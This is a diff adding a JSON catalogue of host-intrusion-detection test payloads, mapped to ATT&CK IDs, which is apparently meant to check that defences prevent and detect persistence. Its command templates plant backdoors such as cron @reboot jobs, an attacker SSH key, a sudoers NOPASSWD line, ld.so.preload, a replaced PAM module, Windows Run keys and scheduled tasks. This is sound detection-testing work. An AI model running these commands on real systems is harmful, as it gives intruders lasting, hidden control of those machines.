@@ -1,0 +1,1114 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: crontab @reboot",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "用户 crontab 加 @reboot 触发恶意脚本。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1053.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "(crontab -l 2>/dev/null;echo '@reboot /tmp/.x.sh') | crontab -",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:crontab"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: cron user backdoor",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/cron.d/ 落带任意用户字段的 cron。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1053.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '* * * * * root /tmp/.x.sh' > /etc/cron.d/sysmgr",
+    "hids_artifact_path": "/etc/cron.d/sysmgr",
+    "hids_expected_artifacts": [
+      "file_create:/etc/cron.d/sysmgr"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: cron.daily script",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/cron.daily/ 落 shell 脚本（无需 cron 表语法）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1053.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '#!/bin/sh\\n/tmp/.x.sh' > /etc/cron.daily/clean;chmod +x /etc/cron.daily/clean",
+    "hids_artifact_path": "/etc/cron.daily/clean",
+    "hids_expected_artifacts": [
+      "file_create:/etc/cron.daily/clean"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: /etc/profile inject",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/profile 末尾追加恶意命令（所有 bash login 触发）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo '/tmp/.x.sh &' >> /etc/profile",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:/etc/profile"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: /etc/profile.d",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/profile.d/.sh 自动加载。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '#!/bin/sh\\n/tmp/.x.sh' > /etc/profile.d/.svc.sh;chmod +x /etc/profile.d/.svc.sh",
+    "hids_artifact_path": "/etc/profile.d/.svc.sh",
+    "hids_expected_artifacts": [
+      "file_create:/etc/profile.d/.svc.sh"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: .bashrc alias",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "~/.bashrc 加 alias ls=恶意命令（间接触发）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo 'alias ls=\"/tmp/.x.sh && /bin/ls\"' >> ~/.bashrc",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:~/.bashrc"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: .bash_profile inject",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "~/.bash_profile 加恶意命令。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo '/tmp/.x.sh &' >> ~/.bash_profile",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:~/.bash_profile"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: /etc/rc.local",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/rc.local 启动时执行（已废弃但 Ubuntu/CentOS 仍兼容）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1037.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "sed -i '/^exit 0/i /tmp/.x.sh' /etc/rc.local",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:/etc/rc.local"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: init.d script",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/init.d/ 落 SysV-init 脚本 + chkconfig on。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1037.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '#!/bin/sh\\n/tmp/.x.sh' > /etc/init.d/svcmgr;chmod +x /etc/init.d/svcmgr;update-rc.d svcmgr defaults",
+    "hids_artifact_path": "/etc/init.d/svcmgr",
+    "hids_expected_artifacts": [
+      "file_create:/etc/init.d/svcmgr"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: systemd system unit",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/systemd/system/*.service 创建 + enable。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1543.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '[Unit]\\nDescription=svc\\n[Service]\\nExecStart=/tmp/.x.sh\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/svcmgr.service;systemctl enable --now svcmgr",
+    "hids_artifact_path": "/etc/systemd/system/svcmgr.service",
+    "hids_expected_artifacts": [
+      "file_create:svcmgr.service",
+      "svc_enable:svcmgr"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: systemd user unit",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "~/.config/systemd/user/ 当前用户 systemd unit。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1543.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "mkdir -p ~/.config/systemd/user/;echo '[Service]\\nExecStart=/tmp/.x.sh' > ~/.config/systemd/user/svcmgr.service;systemctl --user enable --now svcmgr",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_create:user_systemd_unit"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: systemd timer",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "systemd .timer 周期触发恶意 service。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1053.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '[Timer]\\nOnBootSec=1min\\nOnUnitActiveSec=5min\\n[Install]\\nWantedBy=timers.target' > /etc/systemd/system/svc.timer;systemctl enable svc.timer",
+    "hids_artifact_path": "/etc/systemd/system/svc.timer",
+    "hids_expected_artifacts": [
+      "file_create:svc.timer"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: systemd path unit",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": ".path unit 监听文件变更触发。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1543.002"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '[Path]\\nPathChanged=/tmp/trigger\\nUnit=svcmgr.service' > /etc/systemd/system/svc.path;systemctl enable svc.path",
+    "hids_artifact_path": "/etc/systemd/system/svc.path",
+    "hids_expected_artifacts": [
+      "file_create:svc.path"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: ssh authorized_keys",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "在 ~/.ssh/authorized_keys 加攻击者公钥。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1098.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo 'ssh-ed25519 AAAAC3... attacker@C2' >> ~/.ssh/authorized_keys",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:~/.ssh/authorized_keys"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: ssh authorized_keys2 hidden",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "authorized_keys2 (老 OpenSSH 兼容) 隐写式持久化。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1098.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo 'ssh-rsa AAAAB3... attacker' >> ~/.ssh/authorized_keys2",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_create:authorized_keys2"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: sudoers NOPASSWD",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/sudoers 加用户 NOPASSWD ALL 行。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1098"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:/etc/sudoers"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: MOTD persistence",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/update-motd.d/ 增脚本登录时执行。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '#!/bin/sh\\n/tmp/.x.sh' > /etc/update-motd.d/00-x;chmod +x /etc/update-motd.d/00-x",
+    "hids_artifact_path": "/etc/update-motd.d/00-x",
+    "hids_expected_artifacts": [
+      "file_create:motd_x"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: pam_unix backdoor",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "替换 /lib/security/pam_unix.so 留 backdoor。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1556.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "cp pam_unix_backdoor.so /lib/x86_64-linux-gnu/security/pam_unix.so",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:pam_unix.so"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: ld.so.preload",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/ld.so.preload 加 .so → 每进程加载（用户态 rootkit）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1574.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '/tmp/.x.so' > /etc/ld.so.preload",
+    "hids_artifact_path": "/etc/ld.so.preload",
+    "hids_expected_artifacts": [
+      "file_create:ld.so.preload"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: /etc/hosts.allow",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "（老）tcp wrappers + spawn 命令字段。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo 'sshd: ALL: spawn (/tmp/.x.sh): allow' >> /etc/hosts.allow",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:/etc/hosts.allow"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: xinetd service",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/xinetd.d/ 落服务 (老经典)。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1543"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'service hax\\n{\\n  port = 5555\\n  socket_type = stream\\n  server = /tmp/.x.sh\\n  user = root\\n  wait = no\\n  disable = no\\n}' > /etc/xinetd.d/hax;systemctl restart xinetd",
+    "hids_artifact_path": "/etc/xinetd.d/hax",
+    "hids_expected_artifacts": [
+      "file_create:xinetd_hax"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: GRUB inittab",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/etc/inittab (SysV/老 systemd) 加 respawn 行。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1037"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "echo 'pwn:2345:respawn:/tmp/.x.sh' >> /etc/inittab",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "file_modify:/etc/inittab"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: Registry Run key",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "HKCU\\\\...\\\\Run 注册启动项。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1547.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "registry",
+    "hids_command_template": "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v evil /d \"C:\\\\evil.exe\" /f",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "reg_write:HKCU\\Run"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: Registry RunOnce",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "HKLM\\\\...\\\\RunOnce 注册启动项（一次性，再生）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1547.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "registry",
+    "hids_command_template": "reg add HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce /v evil /d \"C:\\\\evil.exe\" /f",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "reg_write:HKLM\\RunOnce"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: Windows service create",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "sc.exe create 新服务以 SYSTEM 启动。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1543.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "service",
+    "hids_command_template": "sc create evilsvc binPath= \"C:\\\\evil.exe\" start= auto & sc start evilsvc",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:sc.exe",
+      "svc_create:evilsvc"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: Scheduled Task create",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-026",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "schtasks create 计划任务。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1053.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "scheduled_task",
+    "hids_command_template": "schtasks /create /tn EvilUpdater /tr \"C:\\\\evil.exe\" /sc onlogon /rl HIGHEST /f",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:schtasks.exe"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Host Persistence: WMI Event Subscription",
+    "payload_external_id": "HIDS-HOSTPERSISTENCE-027",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "WMI EventFilter+EventConsumer 持久化（PowerShell）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1546.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "host_persistence"
+    ],
+    "hids_category": "host_persistence",
+    "hids_execution_mode": "command",
+    "hids_command_template": "Set-WmiInstance -Class __EventFilter -Namespace root\\\\subscription -Arguments @{Name='F';Query='SELECT * FROM __InstanceModificationEvent'}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "wmi:event_filter"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
